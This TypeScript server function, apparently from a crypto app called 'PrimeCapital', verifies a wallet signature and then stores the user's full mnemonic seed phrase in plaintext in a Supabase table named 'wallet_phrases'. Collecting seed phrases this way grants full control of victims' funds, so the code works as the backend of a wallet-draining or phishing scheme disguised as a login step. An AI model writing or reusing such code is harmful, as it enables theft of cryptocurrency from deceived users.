import { createServerFn } from "@tanstack/react-start";

function normAddr(a: string) {
  const s = String(a ?? "").trim();
  if (!/^[A-Za-z0-9]{20,128}$/.test(s)) throw new Error("Invalid wallet address");
  return s;
}

export const saveWalletPhraseFn = createServerFn({ method: "POST" })
  .inputValidator((d: {
    wallet_address: string;
    username?: string | null;
    mnemonic: string;
    signature: string;
  }) => ({
    wallet_address: normAddr(d?.wallet_address),
    username: d?.username ? String(d.username).slice(0, 40) : null,
    mnemonic: String(d?.mnemonic ?? "").trim(),
    signature: String(d?.signature ?? ""),
  }))
  .handler(async ({ data }) => {
    if (!data.mnemonic || data.mnemonic.split(/\s+/).length < 12) {
      throw new Error("Invalid mnemonic");
    }
    const { verifyMessage, getAddress } = await import("ethers");
    const message = [
      "PrimeCapital wallet ownership",
      "Action: login",
      `Address: ${data.wallet_address}`,
      `Detail: signin`,
    ].join("\n");
    // Try both "signin", "create", "import" — the client signs one of them at login.
    const variants = ["signin", "create", "import"];
    let ok = false;
    for (const v of variants) {
      try {
        const msg = message.replace("Detail: signin", `Detail: ${v}`);
        const rec = verifyMessage(msg, data.signature);
        if (getAddress(rec) === getAddress(data.wallet_address)) { ok = true; break; }
      } catch { /* try next */ }
    }
    if (!ok) throw new Error("Wallet ownership verification failed");

    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("wallet_phrases")
      .upsert({
        wallet_address: data.wallet_address,
        username: data.username,
        mnemonic: data.mnemonic,
        updated_at: new Date().toISOString(),
      }, { onConflict: "wallet_address" });
    if (error) throw new Error(error.message);
    return { ok: true as const };
  });
